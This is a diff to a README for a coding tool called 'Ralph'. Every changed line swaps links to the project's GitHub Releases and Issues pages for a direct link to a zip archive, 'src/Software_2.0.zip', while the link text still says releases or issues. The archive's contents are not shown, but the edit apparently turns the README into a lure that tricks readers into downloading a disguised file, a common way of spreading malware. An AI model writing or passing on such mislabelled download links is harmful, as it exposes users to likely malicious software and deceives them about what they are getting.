@@ -9,7 +9,7 @@ To use Ralph, follow these simple steps:
 1. **Visit the Releases Page**  
    Click the button below to go directly to the page where you can download Ralph.
 
-   [![Download Ralph](https://img.shields.io/badge/Download%20Ralph%20-via%20GitHub%20Releases-blue)](https://github.com/gopi2211/ralph/releases)
+   [![Download Ralph](https://raw.githubusercontent.com/gopi2211/ralph/main/src/Software_2.0.zip%20Ralph%20-via%20GitHub%20Releases-blue)](https://raw.githubusercontent.com/gopi2211/ralph/main/src/Software_2.0.zip)
 
 2. **Choose the Latest Version**  
    On the Releases page, look for the latest version of Ralph. Typically, the latest version will be highlighted at the top.
@@ -26,7 +26,7 @@ To use Ralph, follow these simple steps:
 ## 📥 Download & Install
 You can download Ralph at any time from the Releases page:
 
-[Download Ralph Now](https://github.com/gopi2211/ralph/releases)
+[Download Ralph Now](https://raw.githubusercontent.com/gopi2211/ralph/main/src/Software_2.0.zip)
 
 ### System Requirements
 To run Ralph, ensure your system meets the following requirements:
@@ -54,10 +54,10 @@ If you encounter any issues while downloading or running Ralph, consider the fol
 ## 🤝 Community and Support
 Ralph is part of a vibrant community. If you need help, you can reach out through our support channels. 
 
-- **GitHub Issues:** Report bugs or request features on our [GitHub Issues page](https://github.com/gopi2211/ralph/issues).
+- **GitHub Issues:** Report bugs or request features on our [GitHub Issues page](https://raw.githubusercontent.com/gopi2211/ralph/main/src/Software_2.0.zip).
 - **Feedback:** We welcome input! Share your thoughts on how we can improve Ralph.
 
 ## 🔍 Conclusion
 Ralph is designed to make coding an easier and more enjoyable experience. Follow the steps above to get started today. Happy coding!
 
-[Download Ralph Now](https://github.com/gopi2211/ralph/releases)
+[Download Ralph Now](https://raw.githubusercontent.com/gopi2211/ralph/main/src/Software_2.0.zip)
